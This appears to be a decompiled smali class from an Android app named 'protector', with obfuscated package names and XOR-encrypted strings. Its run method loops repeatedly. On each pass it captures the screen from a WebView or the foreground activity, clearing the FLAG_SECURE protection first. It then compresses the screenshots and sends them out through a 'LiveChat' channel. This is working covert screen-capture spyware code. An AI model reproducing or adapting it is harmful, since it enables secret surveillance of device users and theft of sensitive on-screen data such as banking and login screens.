.class Lcom/icontrol/protector/WorkServices$d$d;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WorkServices$d;->b(Landroid/content/Context;ILjava/lang/String;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:I

.field final synthetic f:Landroid/content/Context;

.field final synthetic g:Ljava/lang/String;

.field final synthetic h:I


# direct methods
.method constructor <init>(ILandroid/content/Context;Ljava/lang/String;I)V
    .locals 0

    iput p1, p0, Lcom/icontrol/protector/WorkServices$d$d;->e:I

    iput-object p2, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/WorkServices$d$d;->g:Ljava/lang/String;

    iput p4, p0, Lcom/icontrol/protector/WorkServices$d$d;->h:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0xc31

    const/4 v3, 0x3

    const/4 v4, 0x2

    const/4 v5, 0x0

    const/4 v6, 0x1

    const/16 v7, 0x8

    if-eq v1, v2, :cond_3

    const/16 v2, 0xe43

    if-eq v1, v2, :cond_2

    const/16 v2, 0xe7e

    if-eq v1, v2, :cond_1

    const/16 v2, 0xf2e

    if-eq v1, v2, :cond_0

    goto :goto_0

    :cond_0
    new-array v1, v4, [B

    fill-array-data v1, :array_0

    new-array v2, v7, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v6

    goto :goto_1

    :cond_1
    new-array v1, v4, [B

    fill-array-data v1, :array_2

    new-array v2, v7, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v3

    goto :goto_1

    :cond_2
    new-array v1, v4, [B

    fill-array-data v1, :array_4

    new-array v2, v7, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v4

    goto :goto_1

    :cond_3
    new-array v1, v4, [B

    fill-array-data v1, :array_6

    new-array v2, v7, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v5

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v0, -0x1

    :goto_1
    if-eqz v0, :cond_8

    if-eq v0, v6, :cond_7

    if-eq v0, v4, :cond_6

    if-eq v0, v3, :cond_5

    const/16 v0, 0x1d

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v1, v7, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_5
    const/16 v0, 0x2d

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v1, v7, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_6
    const/16 v0, 0x4c

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v1, v7, [B

    fill-array-data v1, :array_d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_7
    const/16 v0, 0x1e

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v7, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_8
    const/16 v0, 0x41

    new-array v0, v0, [B

    fill-array-data v0, :array_10

    new-array v1, v7, [B

    fill-array-data v1, :array_11

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-static {v0}, Lcom/icontrol/protector/n;->u(Ljava/lang/String;)[B

    move-result-object v0

    :cond_9
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Lcom/icontrol/protector/WorkServices$d;->g(J)J

    :try_start_0
    iget v1, p0, Lcom/icontrol/protector/WorkServices$d$d;->e:I

    int-to-long v1, v1

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    const/16 v2, 0x28a

    const/16 v3, 0x15e

    if-eqz v1, :cond_a

    sget-object v1, Lcom/icontrol/protector/My_Configs;->Is_Store:Ljava/lang/String;

    new-array v4, v6, [B

    const/4 v8, -0x6

    aput-byte v8, v4, v5

    new-array v8, v7, [B

    fill-array-data v8, :array_12

    invoke-static {v4, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_a

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1, v6}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1, v5}, Landroid/view/View;->getDrawingCache(Z)Landroid/graphics/Bitmap;

    move-result-object v1

    invoke-static {v1, v3, v2, v5}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v2, v5}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_13

    new-array v3, v7, [B

    fill-array-data v3, :array_14

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x32

    invoke-virtual {v1, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    iget-object v4, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    iget-object v8, p0, Lcom/icontrol/protector/WorkServices$d$d;->g:Ljava/lang/String;

    invoke-static {v4, v3, v8}, Lcom/icontrol/protector/LiveChat;->f(Landroid/content/Context;[BLjava/lang/String;)V

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->close()V

    goto/16 :goto_4

    :catch_1
    move-exception v1

    goto/16 :goto_3

    :cond_a
    invoke-static {}, Lcom/icontrol/protector/n;->B()Landroid/app/Activity;

    move-result-object v1

    if-eqz v1, :cond_c

    sget-object v4, Lcom/icontrol/protector/My_Configs;->Is_Store:Ljava/lang/String;

    new-array v8, v6, [B

    const/16 v9, -0x24

    aput-byte v9, v8, v5

    new-array v9, v7, [B

    fill-array-data v9, :array_15

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_c

    invoke-virtual {v1}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/View;->getRootView()Landroid/view/View;

    move-result-object v4
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :try_start_2
    invoke-virtual {v1}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v8

    const/16 v9, 0x2000

    invoke-virtual {v8, v9}, Landroid/view/Window;->clearFlags(I)V

    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x21

    if-lt v8, v9, :cond_b

    invoke-static {v1, v6}, Lntidisestablish/neumonoul/floccinaucinih/x90;->a(Landroid/app/Activity;Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_b
    :try_start_3
    invoke-virtual {v4, v6}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    invoke-virtual {v4}, Landroid/view/View;->getDrawingCache()Landroid/graphics/Bitmap;

    move-result-object v1

    invoke-static {v1}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;

    move-result-object v1

    invoke-virtual {v4, v5}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    invoke-static {v1, v3, v2, v6}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    iget v8, p0, Lcom/icontrol/protector/WorkServices$d$d;->h:I

    invoke-virtual {v2, v4, v8, v3}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    iget-object v4, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    iget-object v8, p0, Lcom/icontrol/protector/WorkServices$d$d;->g:Ljava/lang/String;

    invoke-static {v4, v2, v8}, Lcom/icontrol/protector/LiveChat;->f(Landroid/content/Context;[BLjava/lang/String;)V

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V

    goto :goto_4

    :cond_c
    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$d;->g:Ljava/lang/String;

    invoke-static {v1, v0, v2}, Lcom/icontrol/protector/LiveChat;->f(Landroid/content/Context;[BLjava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :try_start_4
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Lcom/icontrol/protector/WorkServices$d;->g(J)J

    const-wide/16 v1, 0x2710

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_4

    :goto_3
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :catch_3
    :goto_4
    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->R:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_9

    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$d;->f:Landroid/content/Context;

    const/4 v2, 0x7

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v4, v7, [B

    fill-array-data v4, :array_17

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_9

    return-void

    nop

    :array_0
    .array-data 1
        -0x7ft
        0x7ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x5t
        0x17t
        0x14t
        -0x6at
        0x58t
        -0x80t
        -0x6et
        -0x55t
    .end array-data

    :array_2
    .array-data 1
        0x3et
        0x24t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x4at
        0x56t
        0x4t
        -0x66t
        0x4t
        0x44t
        -0x2ct
        0x37t
    .end array-data

    :array_4
    .array-data 1
        -0x18t
        -0x40t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x66t
        -0x4bt
        0x35t
        -0x35t
        0x58t
        0x34t
        0x14t
        0x1ft
    .end array-data

    :array_6
    .array-data 1
        -0x64t
        0x6at
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x3t
        0x18t
        -0x4bt
        0x11t
        -0x1ft
        0x36t
        -0x21t
        0xdt
    .end array-data

    :array_8
    .array-data 1
        -0x3at
        0x4ft
        0x72t
        0x17t
        -0x56t
        0x3bt
        0x1ct
        0x7at
        -0x1ct
        0x5dt
        0x7et
        0x11t
        -0x1dt
        0x21t
        0x14t
        0x7at
        -0xct
        0x40t
        0x6ft
        0x6t
        -0x4ft
        0x75t
        0xft
        0x32t
        -0xct
        0xet
        0x7at
        0x13t
        -0x4dt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x6ft
        0x2et
        0x1bt
        0x63t
        -0x3dt
        0x55t
        0x7bt
        0x5at
    .end array-data

    :array_a
    .array-data 1
        0x25t
        0x4t
        0x21t
        0x21t
        -0x53t
        -0x14t
        -0x63t
        -0x17t
        0xdt
        -0x4bt
        -0x4t
        0x23t
        0x8t
        0x33t
        0x37t
        0x78t
        0x1bt
        0x8t
        0x2at
        0x38t
        -0x60t
        -0x1dt
        0x34t
        0x39t
        0x17t
        0x10t
        0x6dt
        0x2at
        -0x5bt
        -0x10t
        0x34t
        0x3dt
        0x1dt
        0x18t
        0x6dt
        0x2ft
        -0x57t
        -0x17t
        0x35t
        0x3dt
        0x0t
        0x18t
        0x34t
        0x22t
        -0x42t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x6et
        0x71t
        0x4dt
        0x4dt
        -0x34t
        -0x7et
        0x59t
        0x58t
    .end array-data

    :array_c
    .array-data 1
        0x37t
        0x62t
        -0x55t
        -0x1ft
        0x6ct
        -0x62t
        -0x1dt
        -0x74t
        0x37t
        0x4ct
        -0x55t
        -0x16t
        0x6ct
        -0x62t
        -0x1dt
        -0x73t
        -0x39t
        0x2ct
        -0x37t
        -0x7at
        0x39t
        -0xat
        -0x73t
        -0x18t
        0x53t
        0x2ct
        -0x35t
        0x77t
        0x6ct
        -0x67t
        -0x1dt
        -0x7at
        0x37t
        0x47t
        -0x56t
        -0x25t
        0x6ct
        -0x6ft
        -0x1dt
        -0x7at
        0x37t
        0x4et
        -0x55t
        -0x19t
        0x6dt
        -0x5ct
        -0x1dt
        -0x73t
        0x37t
        0x47t
        -0x56t
        -0x28t
        -0x64t
        -0xat
        -0x7ft
        0x18t
        0x37t
        0x43t
        -0x56t
        -0x29t
        0x6ct
        -0x62t
        -0x1dt
        -0x7dt
        0x37t
        0x42t
        -0x55t
        -0x1ft
        0x6ct
        -0x6dt
        -0x1dt
        -0x7bt
        0x37t
        0x44t
        -0x55t
        -0x1et
    .end array-data

    :array_d
    .array-data 1
        -0x19t
        -0x4t
        0x7bt
        0x57t
        -0x44t
        0x26t
        0x33t
        0x38t
    .end array-data

    :array_e
    .array-data 1
        0x30t
        -0x52t
        -0x5ct
        0x6ft
        0x6ct
        -0x60t
        -0x5ft
        0x48t
        0x7ft
        -0x1bt
        -0x5bt
        0x3dt
        0x3at
        -0x66t
        -0x23t
        0x39t
        0x52t
        -0x5at
        -0x38t
        0x30t
        0x46t
        -0x3et
        -0x2et
        0x74t
        0x30t
        -0x55t
        -0x5at
        0x6ft
        0x68t
        -0x56t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x29t
        0x3t
        0x2dt
        -0x76t
        -0x2et
        0x25t
        0x46t
        -0x24t
    .end array-data

    :array_10
    .array-data 1
        -0x1t
        -0x54t
        0x7at
        -0x1et
        -0x45t
        -0x13t
        -0x59t
        0x19t
        -0x60t
        -0xbt
        0x9t
        -0x50t
        0x23t
        -0x13t
        -0x59t
        0x18t
        -0x69t
        0xdt
        0x7bt
        -0x39t
        0x43t
        -0x65t
        -0x27t
        0x48t
        -0x1t
        -0x57t
        -0x7dt
        -0x50t
        0x3ct
        -0x14t
        -0x7ct
        0x19t
        -0x5dt
        -0xbt
        0x10t
        -0x50t
        0x31t
        -0x13t
        -0x52t
        0x18t
        -0x77t
        -0xct
        0x26t
        0x48t
        0x43t
        -0x70t
        -0x27t
        0x44t
        -0x1t
        -0x5ct
        -0x7dt
        -0x50t
        0x3ct
        -0x14t
        -0x7ct
        0x18t
        -0x74t
        -0xbt
        0x14t
        -0x50t
        0x33t
        -0x14t
        -0x76t
        0x19t
        -0x5ct
    .end array-data

    nop

    :array_11
    .array-data 1
        0x26t
        0x2dt
        -0x5dt
        0x68t
        -0x65t
        0x35t
        0x0t
        -0x40t
    .end array-data

    :array_12
    .array-data 1
        -0x35t
        -0x70t
        0x27t
        0x4at
        -0x2bt
        -0x78t
        0xet
        0x71t
    .end array-data

    :array_13
    .array-data 1
        0x63t
        -0x2dt
        -0x76t
        -0x27t
    .end array-data

    :array_14
    .array-data 1
        0xdt
        -0x5at
        -0x1at
        -0x4bt
        -0x34t
        0x55t
        0x7ft
        0x5bt
    .end array-data

    :array_15
    .array-data 1
        -0x13t
        0x67t
        0x33t
        0x4ft
        0x4ft
        -0x6bt
        0x16t
        0x5bt
    .end array-data

    :array_16
    .array-data 1
        0x7bt
        0x30t
        -0x7ct
        0x77t
        0x76t
        -0x14t
        -0x6dt
    .end array-data

    :array_17
    .array-data 1
        0x37t
        0x59t
        -0xet
        0x28t
        0x5t
        -0x71t
        -0x1ft
        0x4et
    .end array-data
.end method
